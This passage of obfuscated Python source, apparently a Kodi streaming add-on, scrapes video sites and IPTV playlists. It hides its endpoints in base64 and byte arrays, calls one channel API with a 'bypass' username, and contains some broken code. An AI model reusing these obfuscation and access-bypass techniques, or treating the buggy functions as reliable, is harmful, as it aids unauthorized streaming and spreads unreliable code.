   IIIIiI11I11 = 'http://3.bp.blogspot.com/-a_yDotWU_pY/VkotKWaG_gI/AAAAAAAAAUk/8Q5iNM6p37k/s1600/iacgoh.jpg'
   if 'huge' in ooooO0oOoOOoO :
    I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '.HDTV.x264-SS.mp4' , '' ) . replace ( '_HDTV.x264' , '' ) . replace ( '-SS.mp4' , '' ) . replace ( '_720p.HDTV.x264.' , ' ' ) . replace ( '_720p' , '' ) , ooooO0oOoOOoO . replace ( '\\/' , '/' ) , 8006 , IIIIiI11I11 )
   else :
    pass
    if 4 - 4: iI1Ii11iII1 + iIii1I11I1II1 * II1i1IiiIIi11 + Oo * OOooOOo % OoOoOO00
def OO0o0o0oo ( name , url ) :
 iIiII1 = urlresolver . HostedMediaFile ( url ) . valid_url ( )
 if iIiII1 :
  i111iii1I1 = urlresolver . HostedMediaFile ( url ) . resolve ( )
 else :
  IIi1IIIi = open_url ( url )
  url = re . compile ( 'src="(.+?)"></iframe>' ) . findall ( IIi1IIIi ) [ 0 ]
  url = url . split ( '?autoplay' ) [ 0 ]
  IIi1IIIi = open_url ( url )
  iiIiII1 = re . compile ( 'mp4","url":"(.+?)"' ) . findall ( IIi1IIIi ) [ - 1 ]
  i111iii1I1 = iiIiII1 . replace ( '\\/' , '/' )
 IiI1iI1 = xbmcgui . ListItem ( name , '' , '' )
 IiI1iI1 . setPath ( i111iii1I1 )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , IiI1iI1 )
 if 37 - 37: O0 + oOO * i11i1
 if 27 - 27: O0 . OoOoOO00 + iI1Ii11iII1 % OOooOOo
def oo0O0oOOO0o ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5kaXppYm94aGQuY29tLw==' ) )
 IiI11iII1 = re . compile ( 'class="film menu-item menu-item-type-post_type menu-item-object-page menu-item-36980"><a href="(.+?)"><i class="fa fa-film"></i><span>(.+?)</span></a></li>' ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( 'class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52949"><a href="(.+?)"><i class="fa fa-"></i><span>(.+?)</span></a></li>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( 'Diziler' , 'Series' ) , ooooO0oOoOOoO , 7071 , ii11iIi1I + 'popcorn.png' )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IIII11I1I :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( 'Filmler' , 'Movies' ) , ooooO0oOoOOoO , 7071 , ii11iIi1I + 'popcorn.png' )
  if 70 - 70: Oo % oO0O . ii11ii1ii
def Ii1111iiI ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 IiI11iII1 = re . compile ( '<a class="nav-item" href="(.+?)">(.+?)</a>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  if 'Movies' in oO00oooOOoOo0 :
   oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.snagfilms.com' + ( ooooO0oOoOOoO ) . replace ( 'http://www.snagfilms.com' , '' ) , 7061 , ii11iIi1I + 'popcorn.png' )
def I1Io0oO0oo ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIi1IIIi )
 IiI11iII1 = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( "<li class='current'>.+?</li><li ><a href='(.+?)'>.+?</a></li><li" , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , IIIIiI11I11 )
 for url in IIII11I1I :
  oo0o0000Oo0 ( '[COLORgreen]NEXT PAGE[/COLOR]' , ( url ) . replace ( '&#038;' , '&' ) , 7063 , ii11iIi1I + 'Next.png' )
  if 98 - 98: OoooooooOO - OOOo0 + oOO
  if 98 - 98: II1i1IiiIIi11 . iI1Ii11iII1 . iI1Ii11iII1 - i11i1
def oOOO0o ( url ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3d3dy5zbmFnZmlsbXMuY29tL2NhdGVnb3JpZXMv' ) )
 IiI11iII1 = re . compile ( '<a class="object-link size-poster".+?href="(.+?)" data-type="category">.+?src="(.+?)" alt="Image of (.+?)" />' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7062 , IIIIiI11I11 )
  if 18 - 18: ii11ii1ii / Oo - II1i1IiiIIi11
oO000 = '{UJ},' ; oOOO00oOO = '{WE},' ; iiIIiIi = '{WP},' ; O000oO = '{PP},'
def ii11Ii1IiiI1 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'href="(.+?)".+?src="(.+?)" alt="Image of (.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '&#x27;' , '' ) , 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) , 7067 , IIIIiI11I11 )
  if 83 - 83: oOO + i1IIi * OoooooooOO * Ooo0OO0oOO
def OoO0o0OO ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class="film-container">.+?<iframe src="(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  II11IiI1 ( 'http://www.snagfilms.com' + ( url ) . replace ( 'http://www.snagfilms.com' , '' ) )
  if 21 - 21: Ooo00oOo00o
def II11IiI1 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'file: "(.+?)",.+?label: "(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 222 , ii11iIi1I + 'popcorn.png' )
  if 63 - 63: OOoo0OO0 . O0 * OOoo0OO0 + iIii1I11I1II1
  if 46 - 46: i1IIi + OoOoOO00 * i1IIi - oO0O
  if 79 - 79: OoOoOO00 - Ooo0OO0oOO * ii11ii1ii - I1IiI . ii11ii1ii
  if 11 - 11: O0 * I1IiI
def IIii1i ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '</h4><p><ul><li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( '<li><a href="([^"]*)">(.+?)<.+?class=' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  if '(cooltvseries.com)' in oO00oooOOoOo0 :
   I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + ' -(360)-[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
 for url , oO00oooOOoOo0 in IIII11I1I :
  if '(cooltvseries.com)' in oO00oooOOoOo0 :
   I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( ' - (cooltvseries.com).mp4' , '' ) , url , 7053 , ii11iIi1I + 'CoolSeries.png' )
def o00oo ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<source type="video/mp4" src="([^"]*)"/>' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  o00OOo ( ( url ) . replace ( ' ' , '%20' ) )
Ii11IIIi1 = '{XX},' ; ooooooo00oO0OO = '{UD},' ; IIIii11 = '{YT},' ; i1i11I1I1 = '{JS},' ; OOOOOoooO = '{PF},'
if 59 - 59: Ooo0OO0oOO % oOO
def ii1I ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vc2VjcmV0L2Nsb3VkLnBocA==' ) )
 IiI11iII1 = re . compile ( '<li class="col-sm-2">.+?<a href="#" class="thumbnail" data-src="(.+?)" data-toggle="modal".+?data-target="#infoModal" name="(.+?)"> <img src="(.+?)" alt=".+?" width="130px"' , re . DOTALL ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  I1i1iii1Ii ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , 'http://stream.cloudtv.bz/stream/channel/20/' + ( i1111 ( ooooO0oOoOOoO ) ) , 222 , IIIIiI11I11 )
  if 8 - 8: oO0O + OOOo0 . OOOo0 . I1IiI
def OOOOooO0 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'src="([^"]*)".+?alt=""></a><div class="entry unvoted"><p class="title"><a class="title may-blank " href="([^"]*)" tabindex=.+?>(.+?)</a>' , re . DOTALL ) . findall ( IIi1IIIi )
 next = re . compile ( '<a href="([^"]*)" rel="nofollow next"' , re . DOTALL ) . findall ( IIi1IIIi )
 for IIIIiI11I11 , url , oO00oooOOoOo0 in IiI11iII1 :
  if 'youtu' in url :
   I1i1iii1Ii ( ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' ) . replace ( '&quot;' , '"' ) . replace ( '&' , ' & ' ) , url , 7051 , 'http:' + IIIIiI11I11 )
 for url in next :
  oo0o0000Oo0 ( '[COLORgreen]NEXT[/COLOR]' , url , 7050 , ii11iIi1I + 'Next.png' )
  if 86 - 86: iI1Ii11iII1
def Iii1I ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'rel="shortlink" href="([^"]*)">' , re . DOTALL ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  yt . PlayVideo ( ( url ) . replace ( 'https://youtu.be/' , '' ) )
  if 100 - 100: OoooooooOO . Oo / ii11ii1ii
def I11i1I11iIii ( url ) :
 IIi1IIIi = I1ii1Ii1
 IiI11iII1 = re . compile ( 'id:"(.+?)",url:"(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 for url , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( '[COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , url , 222 , IIIIiI11I11 )
  if 81 - 81: oO0O / ii11ii1ii + Ooo0OO0oOO / i11i1 + I1IiI
  if 85 - 85: Oo . i11iIiiIii - i11iIiiIii . OOOo0 . Ooo00oOo00o % OoooooooOO
  if 20 - 20: I1I1ii + I1I1ii * OoOoOO00 * iIii1I11I1II1 % O0 * OOOo0
  if 62 - 62: OoooooooOO / I1IiI . iI1Ii11iII1 . iI1Ii11iII1 % oOO
  if 42 - 42: OOooOOo . i11i1 - oOO
def Iiii ( ) :
 if 56 - 56: OOoo0OO0 - O0 / O0 * i1IIi . OoooooooOO % iIii1I11I1II1
 oo0o0000Oo0 ( 'All Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Entertainment' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Movies' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Music' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'News' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Sports' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Documentary' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Kids' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Food' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Religious' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'USA Channels' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 oo0o0000Oo0 ( 'Other' , '' , 7021 , ii11iIi1I + 'livetv.png' )
 if 21 - 21: iI1Ii11iII1 - OOOo0 % OoooooooOO + OOooOOo
 if 92 - 92: oOO + iI1Ii11iII1
def Oooo ( Cat_Name ) :
 if 87 - 87: iI1Ii11iII1 . i1IIi % OoooooooOO * i11iIiiIii
 o0oOo = False
 OoIIiIIIII1I = '0'
 if Cat_Name == 'All Channels' : o0oOo = True
 if Cat_Name == 'Entertainment' : OoIIiIIIII1I = '1'
 if Cat_Name == 'Movies' : OoIIiIIIII1I = '2'
 if Cat_Name == 'Music' : OoIIiIIIII1I = '3'
 if Cat_Name == 'News' : OoIIiIIIII1I = '4'
 if Cat_Name == 'Sports' : OoIIiIIIII1I = '5'
 if Cat_Name == 'Documentary' : OoIIiIIIII1I = '6'
 if Cat_Name == 'Kids' : OoIIiIIIII1I = '7'
 if Cat_Name == 'Food' : OoIIiIIIII1I = '8'
 if Cat_Name == 'Religious' : OoIIiIIIII1I = '9'
 if Cat_Name == 'USA Channels' : OoIIiIIIII1I = '10'
 if Cat_Name == 'Other' : OoIIiIIIII1I = '11'
 if 96 - 96: i11iIiiIii . OoOoOO00
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 IiI11iII1 = re . compile ( '"id":".+?","name":"(.+?)","img":"(.+?)","stream_url3":".+?","cat_id":"(.+?)","stream_url2":".+?","stream_url":".+?"}' , re . DOTALL ) . findall ( IIi1IIIi )
 print 'Len Match: >>>' + str ( len ( IiI11iII1 ) )
 for oO00oooOOoOo0 , IIIIiI11I11 , O0Ooo0O in IiI11iII1 :
  iii1oOo0OoOOOo0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  if O0Ooo0O == OoIIiIIIII1I :
   oo0o0000Oo0 ( oO00oooOOoOo0 , '' , 7022 , iii1oOo0OoOOOo0 )
  elif o0oOo == True :
   oo0o0000Oo0 ( oO00oooOOoOo0 , '' , 7022 , iii1oOo0OoOOOo0 )
  else : pass
  if 7 - 7: i1IIi
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 63 - 63: iIii1I11I1II1 + iI1Ii11iII1 % i1IIi / OOOo0 % OoOoOO00
def OO0 ( Search_Name ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYvRGVzaVN0cmVhbXMvaW5kZXgyMDIucGhwP3RhZz1nZXRfYWxsX2NoYW5uZWwmdXNlcm5hbWU9YnlwYXNz' ) )
 IiI11iII1 = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( IIi1IIIi )
 IiI11iII1 = re . compile ( '"id":".+?","name":"' + Search_Name + '","img":"(.+?)","stream_url3":"(.+?)","cat_id":".+?","stream_url2":"(.+?)","stream_url":"(.+?)"}' , re . DOTALL ) . findall ( IIi1IIIi )
 for IIIIiI11I11 , ooooO0oOoOOoO , I1III1111iIi , OooOo0oo0O0o00O in IiI11iII1 :
  iii1oOo0OoOOOo0 = i1111 ( 'aHR0cDovL3VrdHZub3cuZGVzaXN0cmVhbXMudHYv' ) + ( IIIIiI11I11 ) . replace ( '\\' , '' )
  I1i1iii1Ii ( Search_Name + ': Link 1' , ( ooooO0oOoOOoO ) . replace ( '\\' , '' ) , 222 , iii1oOo0OoOOOo0 )
  I1i1iii1Ii ( Search_Name + ': Link 2' , ( I1III1111iIi ) . replace ( '\\' , '' ) , 222 , iii1oOo0OoOOOo0 )
  I1i1iii1Ii ( Search_Name + ': Link 3' , ( OooOo0oo0O0o00O ) . replace ( '\\' , '' ) , 222 , iii1oOo0OoOOOo0 )
  if 48 - 48: i1IIi * OOOo0
def iiiIIiii11I1 ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 IiI11iII1 = re . compile ( '#EXTINF:-1,(.+)\s*(.+)\s*' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , ooooO0oOoOOoO in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , ( ooooO0oOoOOoO ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) + '|connection=keep-alive' , 222 , ii11iIi1I + 'english.png' )
def oo0OOoooo0O0 ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( oo ( 0 , [ 97 ] , [ 221 , 72 , 245 , 82 , 68 , 48 , 242 , 99 , 143 , 68 , 9 , 111 , 24 , 118 , 180 , 76 , 29 , 51 , 14 , 100 , 187 , 51 , 105 , 100 , 106 , 121 , 52 , 53 , 240 , 114 , 26 , 98 , 252 , 50 , 197 , 82 , 218 , 112 , 19 , 99 , 94 , 71 , 54 , 120 , 104 , 108 , 174 , 101 , 107 , 72 , 168 , 82 , 191 , 50 , 88 , 76 , 90 , 109 , 138 , 78 , 24 , 118 , 89 , 76 , 218 , 110 , 231 , 86 , 105 , 114 , 252 , 76 , 37 , 50 , 36 , 82 , 96 , 118 , 27 , 100 , 120 , 50 , 160 , 53 , 72 , 115 , 200 , 98 , 80 , 50 , 201 , 70 , 114 , 107 , 9 , 99 , 113 , 121 , 127 , 57 , 155 , 106 , 213 , 97 , 194 , 71 , 192 , 70 , 162 , 116 , 27 , 99 , 46 , 71 , 191 , 108 , 4 , 118 , 24 , 98 , 27 , 109 , 105 , 108 , 89 , 119 , 164 , 100 , 88 , 72 , 237 , 89 , 93 , 117 , 40 , 98 , 211 , 84 , 75 , 78 , 216 , 49 ] ) ) )
 IiI11iII1 = re . compile ( '#EXTINF:-2,(.+)\s*(.+)\s*' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , ooooO0oOoOOoO in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , ( ooooO0oOoOOoO ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'xxx.png' )
def oOoO000 ( ) :
 IIi1IIIi = I1ii1Ii1 ( i1111 ( oo ( 0 , [ 97 , 129 , 72 , 149 , 82 , 100 , 48 , 63 , 99 , 170 , 68 , 159 , 111 , 42 , 118 , 83 , 76 , 128 , 51 , 61 , 100 , 44 , 51 , 201 , 100 , 148 , 121 , 134 , 53 ] , [ 159 , 114 , 70 , 98 , 144 , 50 , 37 , 82 , 253 , 112 , 184 , 99 , 50 , 71 , 154 , 120 , 110 , 108 , 179 , 101 , 250 , 72 , 65 , 82 , 125 , 50 , 52 , 76 , 28 , 109 , 124 , 78 , 191 , 118 , 193 , 76 , 193 , 110 , 145 , 86 , 92 , 114 , 193 , 76 , 41 , 50 , 82 , 82 , 206 , 118 , 32 , 100 , 163 , 50 , 209 , 53 , 191 , 115 , 42 , 98 , 30 , 50 , 237 , 70 , 26 , 107 , 70 , 99 , 64 , 121 , 115 , 57 , 230 , 116 , 32 , 97 , 39 , 88 , 58 , 104 , 38 , 50 , 77 , 98 , 185 , 50 , 86 , 81 , 80 , 117 , 111 , 98 , 226 , 84 , 75 , 78 , 210 , 49 ] ) ) )
 IiI11iII1 = re . compile ( '#EXTINF:.+?,(.+)\s*(.+)\s*' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , ooooO0oOoOOoO in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , ( ooooO0oOoOOoO ) . replace ( '"' , ' ' ) . replace ( '&' , '&' ) . strip ( ) , 222 , ii11iIi1I + 'vod(1).png' )
  if 86 - 86: iIii1I11I1II1 - OOoo0OO0 % oOO . i11i1 * I1IiI . i1IIi
def O0o0O0 ( url ) :
 url
 OO0Oo00OO0oo = xbmcgui . ListItem ( oO00oooOOoOo0 , path = url )
 xbmcplugin . setResolvedUrl ( int ( sys . argv [ 1 ] ) , True , OO0Oo00OO0oo )
 return
 if 53 - 53: Ooo00oOo00o - oOO + oO0O
 if 29 - 29: i11i1 + OoooooooOO + Ooo0OO0oOO * OOOo0 - oO0O / i11iIiiIii
def iiiIIiiIi ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a class=.+?href="(.+?)">.+?<div class="videothumboverlay hidden-xs" id=".+?">(.+?)</div>.+?<div class="videothumbbox"><img src="(.+?)" class="videothumb" alt="(.+?)"></div>' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( "<a href='(.+?)' class='paginationnext'>Next &raquo;</a></div>" ) . findall ( IIi1IIIi )
 for url , o0OoOO , IIIIiI11I11 , oO00oooOOoOo0 in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , 'https://www.fitnessblender.com' + url , 7086 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , ( o0OoOO ) . replace ( '</p>' , ' ' ) . replace ( '<p>' , ' ' ) )
  i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 for url in IIII11I1I :
  oo0o0000Oo0 ( 'NEXT' , 'https://www.fitnessblender.com' + url , 7085 , ii11iIi1I + 'Next.png' )
  if 86 - 86: OoooooooOO % OoOoOO00 . OoooooooOO * ii11ii1ii
def iI1II1i ( url ) :
 Oo0oO00o = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<div class=\'videowrapper\'>.+?src="//www.youtube.com/embed/(.+?)?rel=0&amp;wmode=transparent" frameborder="0"></iframe></div>.+?<h3 class="videodetailheader">(.+?)</h3>.+?<p class="videodetailvalue"><img src=\'(.+?)\'/></p>' , re . DOTALL ) . findall ( Oo0oO00o )
 for url , o0OoOO , IIIIiI11I11 in IiI11iII1 :
  oo00O00oO ( 'PLAY' , url , 8043 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , o0OoOO )
  i1IIIiiII1 ( 'tvshows' , 'Media Info 3' )
 II1Ii = re . compile ( '<h2 class="videodetailheader">Workout Details</h2>(.+?)</div>' , re . DOTALL ) . findall ( Oo0oO00o )
 for iI1iI in II1Ii :
  oOo = ( iI1iI ) . replace ( '<p>' , '' ) . replace ( '</p>' , '' ) . replace ( '<br />' , '' ) . replace ( '&nbsp;' , '' ) . replace ( '<strong>' , '' ) . replace ( '</strong>' , '' ) . replace ( '"' , '' ) . replace ( '<' , '' ) . replace ( '>' , '' ) . replace ( 'a href' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&rsquo;t' , '' ) . replace ( '&' , '&' )
  iIiIIIi ( 'INFO' , '' , 7087 , 'https://www.fitnessblender.com' + IIIIiI11I11 , '' , oOo )
  if 9 - 9: OOooOOo - iI1Ii11iII1 + iIii1I11I1II1 + Ooo00oOo00o
def IIIIIiI1I1 ( INFO ) :
 i1Iii1i1I ( 'info for workout' , INFO )
 if 62 - 62: OOooOOo / iIii1I11I1II1
 if 55 - 55: oO0O / Ooo00oOo00o + II1i1IiiIIi11 . iI1Ii11iII1
 if 47 - 47: O0
def OooOoo ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'cat-item-.+?"><a href="(.+?)" >(.+?)</a>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , url , 9031 , ii11iIi1I + 'icon.png' )
def Oooo0Oo00o ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" title=".+?" rel="bookmark"><time class="entry-date published updated" datetime=".+?">(.+?)</time></a>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , url , 9032 , ii11iIi1I + 'icon.png' )
def IIoO ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '#EXTINF:-.+?,(.+)\s*(.+)\s*' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  if '://' in oO00oooOOoOo0 :
   pass
   I1i1iii1Ii ( ( oO00oooOOoOo0 ) . replace ( '<br />' , '' ) , ( url ) . replace ( '<br />' , '' ) , 222 , ii11iIi1I + 'icon.png' )
def iI1I ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'EXTINF:-.+?,(.+)</div></li><li class=".+?"><div class=".+?">(.+?)</div>).findall' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  I1i1iii1Ii ( oO00oooOOoOo0 , url , 222 , ii11iIi1I + 'icon.png' )
  if 6 - 6: Ooo00oOo00o
  if 99 - 99: OOooOOo * i11i1 % Ooo0OO0oOO * Ooo0OO0oOO + OoooooooOO
  if 82 - 82: OOoo0OO0 / I1IiI - i11i1 / oOO
def I1iIIi ( ) :
 IIi1IIIi = I1ii1Ii1 ( 'http://www.disclose.tv/action/videolist/aliens/page/1/all/channel/1/category/1/' )
 IiI11iII1 = re . compile ( '<li><a href="([^"]*)">(.+?)</a></li>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , 'http://www.disclose.tv/' + ooooO0oOoOOoO , 7010 , ii11iIi1I + 'disclose.png' )
  if 46 - 46: OOOo0 . iI1Ii11iII1 - i11iIiiIii - I1I1ii
  if 97 - 97: OoOoOO00 % Oo * iI1Ii11iII1
def oOoOO0O00o ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'href="([^"]*)"><img width="135" height="76" alt="([^"]*)".+?src="([^"]*)" />' , re . DOTALL ) . findall ( IIi1IIIi )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 , IIIIiI11I11 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , 'http://www.disclose.tv/' + url , 7011 , IIIIiI11I11 )
 for url in next :
  oo0o0000Oo0 ( 'NEXT' , url , 7010 , ii11iIi1I + 'Next.png' )
  if 77 - 77: I1I1ii + Ooo0OO0oOO
  if 38 - 38: ii11ii1ii - oO0O * OOooOOo
def iIIIi1iii1I11 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( 'url: "([^"]*)",' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( "src='([^']*)' type='([^']*)' />" , re . DOTALL ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  if 'http' in url :
   I1i1iii1Ii ( 'video/flv' , url , 222 , ii11iIi1I + 'disclose.png' )
 for url , oO00oooOOoOo0 in IIII11I1I :
  I1i1iii1Ii ( oO00oooOOoOo0 , url , 222 , ii11iIi1I + 'disclose.png' )
  if 81 - 81: iI1Ii11iII1 / iI1Ii11iII1 / Ooo00oOo00o % Ooo0OO0oOO . iIii1I11I1II1
  if 85 - 85: oO0O
def Oo0O0OooOooo0 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
